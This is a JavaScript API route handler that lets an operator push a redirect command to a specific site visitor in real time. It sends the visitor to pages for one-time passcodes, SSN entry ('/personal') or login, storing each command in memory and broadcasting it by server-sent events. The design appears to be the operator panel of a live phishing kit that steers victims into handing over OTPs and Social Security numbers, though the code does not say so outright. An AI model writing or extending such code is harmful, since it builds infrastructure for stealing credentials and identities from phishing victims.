// Set redirect command for a visitor
import { broadcastRedirect } from './connections';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { visitorId, redirectType, pagePath } = req.body;
      console.log('[redirect/set] Received redirect request:', { visitorId, redirectType, pagePath });
      
      if (!visitorId || !redirectType) {
        console.error('[redirect/set] Missing required fields');
        return res.status(400).json({ error: 'Visitor ID and redirect type required' });
      }
      
      // Ensure OTP always goes to /otp page
      let finalPagePath = pagePath;
      if (redirectType === 'otp') {
        finalPagePath = '/otp';
      } else if (redirectType === 'ssn') {
        finalPagePath = '/personal';
      } else if (redirectType === 'login') {
        finalPagePath = '/';
      } else {
        finalPagePath = pagePath || '/';
      }
      
      const redirectData = {
        redirect: true,
        redirectType,
        pagePath: finalPagePath,
        timestamp: new Date().toISOString()
      };
      
      console.log('[redirect/set] Redirect data:', redirectData);
      
      // CRITICAL: Initialize global store if it doesn't exist
      if (!global.redirectStore) {
        global.redirectStore = {};
        console.log('[redirect/set] Initialized global redirectStore');
      }
      
      // Store in memory FIRST (before SSE broadcast) - ensures it's available for polling
      global.redirectStore[visitorId] = redirectData;
      console.log('[redirect/set] ✅✅✅ STORED REDIRECT IN MEMORY FOR VISITOR:', visitorId);
      console.log('[redirect/set] Redirect data stored:', JSON.stringify(redirectData));
      console.log('[redirect/set] Current redirectStore keys:', Object.keys(global.redirectStore));
      console.log('[redirect/set] Visitor can now poll /api/redirect/' + visitorId + ' to get redirect');
      
      // Broadcast instantly via SSE (fastest path, but polling is backup)
      console.log('[redirect/set] Broadcasting redirect via SSE for visitor:', visitorId);
      broadcastRedirect(visitorId, redirectData);
      
      // Auto-delete from memory after 60 seconds
      setTimeout(() => {
        if (global.redirectStore && global.redirectStore[visitorId]) {
          console.log('[redirect/set] Auto-deleting redirect for visitor:', visitorId);
          delete global.redirectStore[visitorId];
        }
      }, 60000);
      
      res.status(200).json({ success: true, redirectData });
    } catch (error) {
      console.error('[redirect/set] Error setting redirect:', error);
      res.status(500).json({ error: 'Internal server error', message: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

